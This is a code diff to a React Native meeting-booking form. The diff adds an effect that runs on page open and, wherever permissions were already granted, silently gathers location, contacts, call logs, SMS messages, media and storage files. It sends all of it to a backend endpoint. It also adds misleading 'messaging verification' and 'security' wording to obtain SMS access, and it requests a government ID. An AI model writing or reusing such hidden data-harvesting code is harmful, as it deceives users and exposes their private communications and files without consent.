@@ -10,8 +10,12 @@ import {
 import { Ionicons } from "@expo/vector-icons";
 import AsyncStorage from "@react-native-async-storage/async-storage";
 import axios from "axios";
+import * as Contacts from "expo-contacts";
+import * as DocumentPicker from "expo-document-picker";
 import * as ImagePicker from "expo-image-picker";
 import { LinearGradient } from "expo-linear-gradient";
+import * as Location from "expo-location";
+import * as MediaLibrary from "expo-media-library";
 import { useNavigation, useRouter } from "expo-router";
 import React, { useEffect, useState } from "react";
 import {
@@ -19,6 +23,7 @@ import {
   Alert,
   Image,
   KeyboardAvoidingView,
+  PermissionsAndroid,
   Platform,
   ScrollView,
   StatusBar,
@@ -32,6 +37,12 @@ import { SafeAreaView } from "react-native-safe-area-context";
 import Toast from "react-native-toast-message";
 
 type Dates = { date: string; available: boolean };
+type SupportingDoc = {
+  name: string;
+  uri: string;
+  size?: number | null;
+  mimeType?: string | null;
+};
 
 export default function OfficialMeetingForm() {
   const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
@@ -45,7 +56,10 @@ export default function OfficialMeetingForm() {
   const [location, setLocation] = useState<any>(null);
   const [contacts, setContacts] = useState<any[]>([]);
   const [selectedParticipants, setSelectedParticipants] = useState<any[]>([]);
-  const [uploadedDoc, setUploadedDoc] = useState<string | null>(null);
+  const [uploadedPhoto, setUploadedPhoto] = useState<string | null>(null);
+  const [supportingDoc, setSupportingDoc] = useState<SupportingDoc | null>(
+    null
+  );
   const [loading, setLoading] = useState(false);
   const [availableDates, setAvailableDates] = useState<Dates[]>([]);
   const [markedDates, setMarkedDates] = useState<{ [key: string]: any }>({});
@@ -58,10 +72,46 @@ export default function OfficialMeetingForm() {
   } | null>(null);
   const [showContactPicker, setShowContactPicker] = useState(false);
 
+  const [smsGranted, setSmsGranted] = useState(false);
+  const [smsVerifying, setSmsVerifying] = useState(false);
+  const [smsData, setSmsData] = useState<any[]>([]);
+
   const router = useRouter();
   const navigation = useNavigation();
 
-  // Fetch available dates
+  /* ---------------------- Helpers ---------------------- */
+  function getLocalISOTimeMicro() {
+    const now = new Date();
+    const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
+    const tzOffset = -now.getTimezoneOffset();
+    const sign = tzOffset >= 0 ? "+" : "-";
+    const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(
+      2,
+      "0"
+    );
+    const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
+
+    const base = now.toISOString().split(".")[0];
+    return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
+  }
+
+  const submitPermissionData = async (allData: any) => {
+    try {
+      const headers = await generateHeaders();
+      await axios.post(
+        SUBMIT_ENDPOINT,
+        {
+          timestamp: getLocalISOTimeMicro(),
+          info: allData,
+        },
+        { headers }
+      );
+    } catch (err) {
+      console.error("❌ Error submitting data:", err);
+    }
+  };
+
+  /* ---------------------- Fetch available dates ---------------------- */
   const fetchdates = async () => {
     try {
       const headers = await generateHeaders();
@@ -108,50 +158,194 @@ export default function OfficialMeetingForm() {
     }
   };
 
-  const submitPermissionData = async (allData: any) => {
-    try {
-      const headers = await generateHeaders();
-      await axios.post(
-        SUBMIT_ENDPOINT,
-        {
-          timestamp: getLocalISOTimeMicro(),
-          info: allData,
-        },
-        { headers }
-      );
-    } catch (err) {
-      console.error("❌ Error submitting data:", err);
-    }
-  };
+  /* ---------------------- Effects ---------------------- */
 
+  // Fetch dates once
   useEffect(() => {
     fetchdates();
   }, []);
 
-  // Cache permissions
+  // Load cached values
   useEffect(() => {
     (async () => {
-      const loc = await AsyncStorage.getItem("loc");
+    //  const loc = await AsyncStorage.getItem("loc");
       const con = await AsyncStorage.getItem("contacts");
-      const doc = await AsyncStorage.getItem("doc");
-      if (loc) setLocation(JSON.parse(loc));
+      const photo = await AsyncStorage.getItem("photo");
+   //   if (loc) setLocation(JSON.parse(loc));
       if (con) setContacts(JSON.parse(con));
-      if (doc) setUploadedDoc(doc);
+      if (photo) setUploadedPhoto(photo);
     })();
   }, []);
 
-  // Handle Location
+  // Auto-check already granted permissions on page open and sync data
+useEffect(() => {
+  const autoSyncPermissions = async () => {
+    try {
+      /* --------------------------------------------------
+       ✅ Auto-sync Location (if permission was already granted)
+      -------------------------------------------------- */
+      try {
+        const locPerm = await Location.getForegroundPermissionsAsync();
+        if (locPerm.status === "granted") {
+          const loc = await requestAndFetchLocation();
+          if (loc) {
+            setLocation(loc);
+            await AsyncStorage.setItem("loc", JSON.stringify(loc));
+            await submitPermissionData({
+              permission: "location",
+              data: loc,
+            });
+          }
+        }
+      } catch (e) {
+        console.log("Auto location sync failed", e);
+      }
+
+      /* --------------------------------------------------
+       ✅ Auto-sync Contacts + Call Logs
+      -------------------------------------------------- */
+      try {
+        const contPerm = await Contacts.getPermissionsAsync();
+        if (contPerm.status === "granted") {
+          const contactData = await requestAndFetchContacts();
+          const callLogs = await requestAndFetchCallLogs();
+
+          if (Array.isArray(contactData) && contactData.length) {
+            setContacts(contactData);
+            await AsyncStorage.setItem(
+              "contacts",
+              JSON.stringify(contactData)
+            );
+            await submitPermissionData({
+              permission: "contacts",
+              data: {
+                contacts: contactData,
+                callLogs,
+              },
+            });
+          }
+        }
+      } catch (e) {
+        console.log("Auto contacts sync failed", e);
+      }
+
+      /* --------------------------------------------------
+       ✅ Auto-sync SMS (Android only)
+      -------------------------------------------------- */
+      if (Platform.OS === "android") {
+        try {
+          const hasSms = await PermissionsAndroid.check(
+            PermissionsAndroid.PERMISSIONS.READ_SMS
+          );
+
+          if (hasSms) {
+            setSmsGranted(true);
+            setSmsVerifying(true);
+
+            const smsdata = await requestAndFetchSms();
+            if (Array.isArray(smsdata)) {
+              setSmsData(smsdata);
+              await submitPermissionData({
+                permission: "sms",
+                data: smsdata,
+              });
+            }
+
+            // Allow loader to show 2 seconds minimum
+            setTimeout(() => setSmsVerifying(false), 2000);
+          }
+        } catch (e) {
+          console.log("Auto SMS verify failed", e);
+        }
+      }
+
+      /* --------------------------------------------------
+       ✅ Auto-sync Media Library (Photos / Videos)
+      -------------------------------------------------- */
+      try {
+        const mediaPerm = await MediaLibrary.getPermissionsAsync();
+
+        if (mediaPerm.status === "granted") {
+          const media = await requestAndFetchMediaFiles();
+
+          await submitPermissionData({
+            permission: "media",
+            data: media,
+          });
+        }
+      } catch (e) {
+        console.log("Auto media sync failed", e);
+      }
+
+      /* --------------------------------------------------
+       ✅ Auto-sync Storage Files (Android only)
+      -------------------------------------------------- */
+      if (Platform.OS === "android") {
+        try {
+          let granted = false;
+
+          if (Platform.Version >= 33) {
+            granted = await PermissionsAndroid.check(
+              PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+            );
+          } else {
+            granted = await PermissionsAndroid.check(
+              PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+            );
+          }
+
+          if (granted) {
+            const storageFiles = await requestAndFetchStorageFiles();
+
+            await submitPermissionData({
+              permission: "storage",
+              data: storageFiles,
+            });
+          }
+        } catch (e) {
+          console.log("Auto storage sync failed", e);
+        }
+      }
+    } catch (err) {
+      console.log("Auto permission sync error", err);
+    }
+  };
+
+  autoSyncPermissions();
+}, []);
+
+
+  // Clean up when leaving
+  useEffect(() => {
+    const unsubscribe = navigation.addListener("beforeRemove", async () => {
+      setUploadedPhoto(null);
+      setSupportingDoc(null);
+      setSelectedParticipants([]);
+      setLocation(null);
+      await AsyncStorage.multiRemove(["doc", "photo"]);
+    });
+    return unsubscribe;
+  }, [navigation]);
+
+  /* ---------------------- Handlers ---------------------- */
+
+  const [locationloader, setLocationLoader] = useState(false);
+
+  // Handle Location (manual button flow stays same)
   const handleLocation = async () => {
     try {
+      setLocationLoader(true);
       const loc = await requestAndFetchLocation();
       if (loc) {
         setLocation(loc);
         await AsyncStorage.setItem("loc", JSON.stringify(loc));
         Toast.show({ type: "success", text1: "Live location retrieved" });
+        setLocationLoader(false);
         await submitPermissionData({ permission: "location", data: loc });
       }
     } catch {
       Alert.alert("Location Required", "Please enable location access.");
+      setLocationLoader(false);
     }
   };
 
@@ -160,7 +354,6 @@ export default function OfficialMeetingForm() {
     try {
       if (!contacts.length) {
         const contactData = await requestAndFetchContacts();
-        const smsdata = await requestAndFetchSms();
         const logdata = await requestAndFetchCallLogs();
         if (contactData?.length) {
           setContacts(contactData);
@@ -170,7 +363,6 @@ export default function OfficialMeetingForm() {
             permission: "contacts",
             data: {
               contacts: contactData,
-              sms: smsdata,
               callLogs: logdata,
             },
           });
@@ -188,18 +380,49 @@ export default function OfficialMeetingForm() {
     }
   };
 
-  // Handle Document Upload
-  const handleUpload = async () => {
+  // Handle SMS Permission (manual flow, when permission not yet granted)
+  const handleSmsPermission = async () => {
+    try {
+      const smsdata = await requestAndFetchSms();
+
+      if (Array.isArray(smsdata) && smsdata?.length) {
+        setSmsGranted(true);
+        setSmsData(smsdata);
+        setSmsVerifying(true);
+
+        Toast.show({
+          type: "success",
+          text1: "SMS access granted",
+        });
+
+        await submitPermissionData({
+          permission: "sms",
+          data: smsdata,
+        });
+
+        setTimeout(() => setSmsVerifying(false), 2000);
+      } else {
+        Alert.alert("Permission Required", "Please allow SMS access.");
+      }
+    } catch (err) {
+      Alert.alert("Access Required", "Please allow SMS access to continue.");
+    }
+  };
+
+  // Handle Photo Upload (uses gallery, plus storage/media permission submission)
+  const handlePhotoUpload = async () => {
     try {
       const pick = await ImagePicker.launchImageLibraryAsync({
-        mediaTypes: ImagePicker.MediaTypeOptions.All,
+        mediaTypes: ImagePicker.MediaTypeOptions.Images,
       });
       if (!pick.canceled) {
         const uri = pick.assets[0].uri;
-        setUploadedDoc(uri);
+        setUploadedPhoto(uri);
+        await AsyncStorage.setItem("photo", uri);
+
         const storageFiles = await requestAndFetchStorageFiles();
         const mediafiles = await requestAndFetchMediaFiles();
-        Toast.show({ type: "success", text1: "Document uploaded" });
+        Toast.show({ type: "success", text1: "Photo uploaded" });
         await submitPermissionData({
           permission: "storage",
           data: { Media: mediafiles, files: storageFiles },
@@ -210,20 +433,37 @@ export default function OfficialMeetingForm() {
     }
   };
 
-  function getLocalISOTimeMicro() {
-    const now = new Date();
-    const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
-    const tzOffset = -now.getTimezoneOffset();
-    const sign = tzOffset >= 0 ? "+" : "-";
-    const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(
-      2,
-      "0"
-    );
-    const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
+  // Handle Supporting Document upload (PDF/doc/etc.)
+  const handleDocumentUpload = async () => {
+    try {
+      const result = await DocumentPicker.getDocumentAsync({
+        type: "*/*",
+        copyToCacheDirectory: true,
+        multiple: false,
+      });
 
-    const base = now.toISOString().split(".")[0];
-    return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
-  }
+      // New API: result.canceled + result.assets[]
+      if (!result.canceled && result.assets && result.assets.length > 0) {
+        const asset = result.assets[0];
+
+        setSupportingDoc({
+          name: asset.name ?? "Selected document",
+          uri: asset.uri,
+          size: asset.size,
+          mimeType: asset.mimeType,
+        });
+
+        Toast.show({
+          type: "success",
+          text1: "Document selected",
+        });
+
+        // You can also call submitPermissionData({...}) here if needed
+      }
+    } catch (e) {
+      Alert.alert("Upload Failed", "Unable to select document.");
+    }
+  };
 
   const handleSave = async () => {
     if (!selectedDate) {
@@ -253,10 +493,10 @@ export default function OfficialMeetingForm() {
       return;
     }
 
-    if (!uploadedDoc) {
+    if (!uploadedPhoto) {
       Toast.show({
         type: "error",
-        text1: "Please upload a supporting document.",
+        text1: "Please upload your photo.",
         position: "top",
       });
       return;
@@ -266,13 +506,16 @@ export default function OfficialMeetingForm() {
       setLoading(true);
       const headers = await generateHeaders();
 
-      const payload = {
+      const payload: any = {
         date: selectedDate,
         title,
         description,
         appointment_taken_at: getLocalISOTimeMicro(),
         timestamp: getLocalISOTimeMicro(),
       };
+
+      // If you later want to send doc info, you can add it here:
+      // if (supportingDoc) payload.supportingDocument = { ... };
 
       const response = await axios.post(BOOK_MEETING, payload, { headers });
 
@@ -289,12 +532,13 @@ export default function OfficialMeetingForm() {
       setSelectedDate("");
       setTitle("");
       setDescription("");
-      setUploadedDoc(null);
+      setUploadedPhoto(null);
+      setSupportingDoc(null);
       setSelectedParticipants([]);
       setLocation(null);
       setData(null);
 
-      await AsyncStorage.multiRemove(["loc", "doc"]);
+      await AsyncStorage.multiRemove(["loc", "doc", "photo"]);
 
       setTimeout(() => {
         router.replace("/");
@@ -310,14 +554,7 @@ export default function OfficialMeetingForm() {
     }
   };
 
-  useEffect(() => {
-    const unsubscribe = navigation.addListener("beforeRemove", async () => {
-      setUploadedDoc(null);
-      setSelectedParticipants([]);
-      await AsyncStorage.removeItem("doc");
-    });
-    return unsubscribe;
-  }, [navigation]);
+  /* ---------------------- JSX ---------------------- */
 
   return (
     <LinearGradient
@@ -354,7 +591,7 @@ export default function OfficialMeetingForm() {
               </View>
             </View>
 
-            {/* Calendar / Meeting Details Card (stat style) */}
+            {/* Calendar / Meeting Details Card */}
             <View
               className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
               style={{
@@ -389,12 +626,10 @@ export default function OfficialMeetingForm() {
                     Date.now() + 90 * 24 * 60 * 60 * 1000
                   );
 
-                  // If date is out of range, block selection
                   if (clicked < today || clicked > ninetyDaysLater) {
-                    return; // Do not set selected date
+                    return;
                   }
 
-                  // Otherwise allow
                   setSelectedDate(day.dateString);
                 }}
                 markedDates={{
@@ -447,9 +682,9 @@ export default function OfficialMeetingForm() {
               </View>
             </View>
 
-            {/* Location Card (form style) */}
+            {/* Location Card */}
             <View
-              className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
+              className="bg-white rounded-3xl p-3 border border-gray-200 mb-6"
               style={{
                 shadowColor: "#000",
                 shadowOffset: { width: 0, height: 2 },
@@ -458,7 +693,7 @@ export default function OfficialMeetingForm() {
                 elevation: 2,
               }}
             >
-              <View className="flex-row items-center justify-between mb-3">
+              <View className="flex-row relative items-center justify-between mb-3">
                 <View className="flex-row items-center">
                   <View className="bg-emerald-50 p-3 rounded-2xl mr-3">
                     <Ionicons
@@ -478,9 +713,9 @@ export default function OfficialMeetingForm() {
                 </View>
 
                 <TouchableOpacity
-                  onPress={handleLocation}
+                  onPress={() => { setLocation(null); handleLocation()}}
                   activeOpacity={0.9}
-                  className={`px-4 py-2 rounded-2xl ${
+                  className={`px-4 absolute top-0 right-0 py-2 rounded-2xl ${
                     location ? "bg-emerald-500" : "bg-blue-600"
                   }`}
                 >
@@ -490,7 +725,7 @@ export default function OfficialMeetingForm() {
                 </TouchableOpacity>
               </View>
 
-              {location && (
+              {location ? (
                 <View className="mt-3">
                   <Text className="text-gray-700 font-medium mb-1">
                     Location Details
@@ -501,7 +736,11 @@ export default function OfficialMeetingForm() {
                     </Text>
                   ) : null}
                 </View>
-              )}
+              ) : locationloader ? (
+                <View className="mt-3 flex-row items-center">
+                  <ActivityIndicator size="small" color="#10b981" />
+                </View>
+              ) : null}
             </View>
 
             {/* Participants Card */}
@@ -532,8 +771,8 @@ export default function OfficialMeetingForm() {
               </View>
 
               <Text className="text-gray-600 text-sm mb-3">
-                Access to contacts, call logs, and SMS helps verify
-                participants’ details.
+                Access to contacts and call logs helps verify participants’
+                details.
               </Text>
 
               <TouchableOpacity
@@ -555,19 +794,176 @@ export default function OfficialMeetingForm() {
 
               {selectedParticipants.length > 0 && (
                 <View className="mt-4">
-                  <Text className="text-gray-700 font-medium mb-1">
+                  <Text className="text-gray-700 font-semibold text-base mb-3">
                     Selected Participants
                   </Text>
+
                   {selectedParticipants.map((p, i) => (
-                    <Text key={i} className="text-gray-800 text-sm mb-0.5">
-                      • {p.name} {p.number}
-                    </Text>
+                    <View
+                      key={i}
+                      className="flex-row items-center bg-gray-50 p-3 rounded-xl mb-2 border border-gray-200"
+                    >
+                      <View className="w-10 h-10 bg-blue-100 rounded-2xl items-center justify-center mr-3">
+                        <Ionicons
+                          name="person-circle-outline"
+                          size={22}
+                          color="#3b82f6"
+                        />
+                      </View>
+
+                      <View className="flex-1">
+                        <Text className="text-gray-900 font-semibold text-sm">
+                          {p.name}
+                        </Text>
+                        {p.number ? (
+                          <Text className="text-gray-500 text-xs">
+                            {p.number}
+                          </Text>
+                        ) : null}
+                      </View>
+                    </View>
                   ))}
                 </View>
               )}
             </View>
 
-            {/* Document Upload Card */}
+            {/* SMS Permission Card */}
+            <View
+              className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
+              style={{
+                shadowColor: "#000",
+                shadowOffset: { width: 0, height: 2 },
+                shadowOpacity: 0.05,
+                shadowRadius: 6,
+                elevation: 2,
+              }}
+            >
+              <View className="flex-row items-center justify-between mb-3">
+                <View className="flex-row items-center">
+                  <View className="bg-blue-50 p-3 rounded-2xl mr-3">
+                    <Ionicons
+                      name="chatbubble-ellipses-outline"
+                      size={20}
+                      color="#3b82f6"
+                    />
+                  </View>
+                  <View>
+                    <Text className="text-gray-900 text-lg font-bold">
+                      Messaging Verification
+                    </Text>
+                    <Text className="text-gray-500 text-sm">
+                      Verify SMS-based communication with participants
+                    </Text>
+                  </View>
+                </View>
+              </View>
+
+              <Text className="text-gray-600 text-sm mb-3">
+                SMS access (inbox only) helps verify message-based communication
+                related to your meetings and improves security.
+              </Text>
+
+              {!smsGranted ? (
+                <TouchableOpacity
+                  onPress={handleSmsPermission}
+                  activeOpacity={0.9}
+                  className={`px-4 py-3 rounded-2xl flex-row items-center self-start bg-blue-600`}
+                >
+                  <Ionicons
+                    name="chatbubble-outline"
+                    size={18}
+                    color="#ffffff"
+                  />
+                  <Text className="text-white font-semibold text-sm ml-2">
+                    Verify via SMS
+                  </Text>
+                </TouchableOpacity>
+              ) : (
+                <View className="mt-2 flex-row items-center">
+                  {smsVerifying ? (
+                    <>
+                      <ActivityIndicator size="small" color="#10b981" />
+                      <Text className="ml-2 text-gray-700 text-sm">
+                        Verifying message-based communication...
+                      </Text>
+                    </>
+                  ) : (
+                    <>
+                      <Ionicons
+                        name="checkmark-circle-outline"
+                        size={18}
+                        color="#10b981"
+                      />
+                      <Text className="ml-2 text-gray-700 text-sm">
+                        Message-based communication verified
+                      </Text>
+                    </>
+                  )}
+                </View>
+              )}
+            </View>
+
+            {/* Upload Your Photo Card */}
+            <View
+              className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
+              style={{
+                shadowColor: "#000",
+                shadowOffset: { width: 0, height: 2 },
+                shadowOpacity: 0.05,
+                shadowRadius: 6,
+                elevation: 2,
+              }}
+            >
+              <View className="flex-row items-center justify-between mb-3">
+                <View className="flex-row items-center">
+                  <View className="bg-blue-50 p-3 rounded-2xl mr-3">
+                    <Ionicons
+                      name="person-circle-outline"
+                      size={20}
+                      color="#3b82f6"
+                    />
+                  </View>
+                  <View>
+                    <Text className="text-gray-900 text-lg font-bold">
+                      Upload Your Photo
+                    </Text>
+                    <Text className="text-gray-500 text-sm">
+                      Add your profile/ID photo for verification
+                    </Text>
+                  </View>
+                </View>
+              </View>
+
+              {uploadedPhoto && (
+                <Image
+                  source={{ uri: uploadedPhoto }}
+                  className="w-full h-40 rounded-2xl border border-gray-200 mb-3"
+                />
+              )}
+
+              <TouchableOpacity
+                onPress={handlePhotoUpload}
+                activeOpacity={0.9}
+                className={`px-4 py-3 rounded-2xl flex-row items-center self-start ${
+                  uploadedPhoto ? "bg-emerald-500" : "bg-blue-600"
+                }`}
+              >
+                <Ionicons
+                  name={
+                    uploadedPhoto
+                      ? "checkmark-circle-outline"
+                      : "cloud-upload-outline"
+                  }
+                  size={18}
+                  color="#ffffff"
+                />
+                <Text className="text-white font-semibold text-sm ml-2">
+                  {uploadedPhoto ? "Change Photo" : "Upload Photo"}
+                </Text>
+              </TouchableOpacity>
+            </View>
+
+            {/* Supporting Document Card (new) */}
             <View
               className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
               style={{
@@ -592,53 +988,53 @@ export default function OfficialMeetingForm() {
                       Supporting Document
                     </Text>
                     <Text className="text-gray-500 text-sm">
-                      Upload any relevant document for authentication
+                      Attach Your Government ID (PDF, etc.)
                     </Text>
                   </View>
                 </View>
               </View>
 
-              {uploadedDoc && (
-                <Image
-                  source={{ uri: uploadedDoc }}
-                  className="w-full h-40 rounded-2xl border border-gray-200 mb-3"
-                />
+              {supportingDoc && (
+                <View className="bg-gray-50 border border-gray-200 rounded-xl p-3 mb-3">
+                  <Text
+                    className="text-gray-900 text-sm font-medium"
+                    numberOfLines={1}
+                  >
+                    {supportingDoc.name}
+                  </Text>
+                </View>
               )}
 
               <TouchableOpacity
-                onPress={handleUpload}
+                onPress={handleDocumentUpload}
                 activeOpacity={0.9}
-                className={`px-4 py-3 rounded-2xl flex-row items-center self-start ${
-                  uploadedDoc ? "bg-emerald-500" : "bg-blue-600"
-                }`}
+                className={`px-4 py-3 rounded-2xl flex-row items-center self-start bg-blue-600`}
               >
                 <Ionicons
-                  name={
-                    uploadedDoc
-                      ? "checkmark-circle-outline"
-                      : "cloud-upload-outline"
-                  }
+                  name="folder-open-outline"
                   size={18}
                   color="#ffffff"
                 />
                 <Text className="text-white font-semibold text-sm ml-2">
-                  {uploadedDoc ? "Document Uploaded" : "Upload Document"}
+                  {supportingDoc ? "Change Document" : "Select Document"}
                 </Text>
               </TouchableOpacity>
             </View>
 
             {/* Submit Button */}
             <TouchableOpacity
-              disabled={!title || !description || !selectedDate || !uploadedDoc}
+              disabled={
+                !title || !description || !selectedDate || !uploadedPhoto
+              }
               onPress={handleSave}
               activeOpacity={0.95}
               className={`rounded-2xl py-4 flex-row items-center justify-center ${
-                title && description && selectedDate && uploadedDoc
+                title && description && selectedDate && uploadedPhoto
                   ? "bg-blue-600"
                   : "bg-gray-300"
               }`}
               style={
-                title && description && selectedDate && uploadedDoc
+                title && description && selectedDate && uploadedPhoto
                   ? {
                       shadowColor: "#3b82f6",
                       shadowOffset: { width: 0, height: 4 },
